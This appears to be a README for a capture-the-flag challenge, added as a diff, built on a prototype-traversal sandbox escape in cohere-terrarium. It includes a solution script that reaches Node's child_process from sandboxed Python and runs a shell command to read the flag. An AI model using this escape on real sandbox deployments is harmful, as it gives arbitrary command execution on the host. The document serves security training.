@@ -1,0 +1,25 @@
+Challenge is based on CVE-2026-5752, a prototype traversal in cohere-terrarium leading to sandbox escape.
+
+terrarium has restricted set of modules that the user can import, and the idea is for players to enumerate the file system using them (numpy, pandas, matplotlib, scikit). i.e file system enumeration using pandas' pandas.io.common.os.listdir or reading files using pandas.read_csv . There are other methods to achieve the same thing, up to player's creativity :)
+
+Players will then discover the files from default_python_home and learn that their code is running inside of terrarium.
+Then, they will build the sandbox escape from looking at the patch for CVE-2026-5752.
+
+Solution:
+```
+import js
+
+cmd = "cat /flag*"
+
+Function = js.document.constructor.constructor
+run = Function(
+    "cmd",
+    "var p = globalThis.process;"
+    "var cp = p.getBuiltinModule ? p.getBuiltinModule('child_process')"
+    "  : (p.mainModule && p.mainModule.require"
+    "      ? p.mainModule.require('child_process')"
+    "      : p.mainModule.constructor._load('child_process'));"
+    "return cp.execSync(cmd, {encoding: 'utf8'});",
+)
+print(run(cmd))
+```
